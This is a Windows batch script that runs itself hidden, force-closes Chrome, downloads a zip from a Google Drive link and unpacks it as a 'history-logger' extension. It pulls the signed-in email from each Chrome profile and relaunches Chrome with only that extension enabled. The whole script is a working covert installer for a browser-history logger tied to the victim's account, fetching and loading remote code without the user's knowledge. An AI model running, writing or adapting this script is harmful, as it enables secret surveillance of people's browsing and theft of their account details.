@echo off
if "%1" neq "silent" (
  start "" /min cmd /c "\"%~f0\" silent"
  exit
)
setlocal EnableDelayedExpansion

REM ─── CONFIG ────────────────────────────────────────────────
set "ZIP_URL=https://drive.google.com/uc?export=download&id=1_MrCTaWFitVrrapsDodqTZduIvWKHCtU"
set "SCRIPT_DIR=%~dp0"
set "WORKDIR=%SCRIPT_DIR%history-logger"
REM ─────────────────────────────────────────────────────────────

REM 1) Kill any running Chrome so our flags take effect
taskkill /F /IM chrome.exe >nul 2>&1

REM 2) Clean & recreate the working folder
if exist "%WORKDIR%" rd /s /q "%WORKDIR%"
mkdir "%WORKDIR%"

REM 3) Download & unpack extension.zip from your Drive link
powershell -WindowStyle Hidden -NoProfile -Command ^
  "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%WORKDIR%\ext.zip' -UseBasicParsing" >nul 2>&1

powershell -WindowStyle Hidden -NoProfile -Command ^
  "Expand-Archive -Path '%WORKDIR%\ext.zip' -DestinationPath '%WORKDIR%' -Force" >nul 2>&1

REM 4) Scan all Chrome profiles for the signed-in email
set "EMAIL="
for /D %%P in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do (
  if exist "%%P\Preferences" (
    for /f "delims=" %%E in (`
      powershell -WindowStyle Hidden -NoProfile -Command ^
        "try {(Get-Content -Raw '%%P\Preferences' | ConvertFrom-Json).account_info.email} catch {''}"
    `) do if not defined EMAIL set "EMAIL=%%E"
  )
)
if not defined EMAIL set "EMAIL=anonymous@demo.com"

REM 5) Write config.json next to manifest.js
(
  echo {^"userEmail^":^"%EMAIL%"^}
) > "%WORKDIR%\config.json"

REM 6) Launch Chrome with your unpacked extension loaded & open extensions page
start "" chrome.exe ^
  --disable-extensions-except="%WORKDIR%" ^
  --load-extension="%WORKDIR%" ^
  "chrome://extensions"

endlocal
